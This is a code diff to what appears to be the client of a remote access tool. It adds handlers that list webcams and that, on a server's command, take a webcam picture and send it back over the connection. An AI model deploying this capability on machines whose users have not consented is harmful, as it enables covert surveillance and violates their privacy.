@@ -97,6 +97,62 @@ namespace xClient.Core.Commands
             }
         }
 
+        public static void HandleGetWebcamImage(Packets.ServerPackets.GetWebcamImage command, Client client)
+        {
+            var resolution = "800x600";
+
+            if (StreamCodec == null)
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Webcam, resolution);
+
+            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Webcam
+                || StreamCodec.Resolution != resolution)
+            {
+                if (StreamCodec != null)
+                    StreamCodec.Dispose();
+
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Webcam, resolution);
+            }
+
+            BitmapData desktopData = null;
+            Bitmap webcam = null;
+            try
+            {
+                webcam = WebcamHelper.TakePicture(command.Webcam);
+                desktopData = webcam.LockBits(new Rectangle(0, 0, webcam.Width, webcam.Height),
+                    ImageLockMode.ReadWrite, webcam.PixelFormat);
+
+                using (MemoryStream stream = new MemoryStream())
+                {
+                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
+                    StreamCodec.CodeImage(desktopData.Scan0,
+                        new Rectangle(0, 0, webcam.Width, webcam.Height),
+                        new Size(webcam.Width, webcam.Height),
+                        webcam.PixelFormat, stream);
+                    new Packets.ClientPackets.GetWebcamImageResponse(stream.ToArray(), StreamCodec.ImageQuality,
+                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
+                }
+            }
+            catch (Exception)
+            {
+                if (StreamCodec != null)
+                    new Packets.ClientPackets.GetWebcamImageResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
+                        StreamCodec.Resolution).Execute(client);
+
+                StreamCodec = null;
+            }
+            finally
+            {
+                if (webcam != null)
+                {
+                    if (desktopData != null)
+                    {
+                        webcam.UnlockBits(desktopData);
+                    }
+                    webcam.Dispose();
+                }
+            }
+        }
+
         public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
         {
             Screen[] allScreens = Screen.AllScreens;
@@ -136,6 +192,14 @@ namespace xClient.Core.Commands
             if (Screen.AllScreens.Length > 0)
             {
                 new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
+            }
+        }
+
+        public static void HandleGetWebcams(Packets.ServerPackets.GetWebcams command, Client client)
+        {
+            if (WebcamHelper.GetAllDevices().Count > 0)
+            {
+                new Packets.ClientPackets.GetWebcamsResponse(WebcamHelper.GetAllDevices().Count).Execute(client);
             }
         }
 
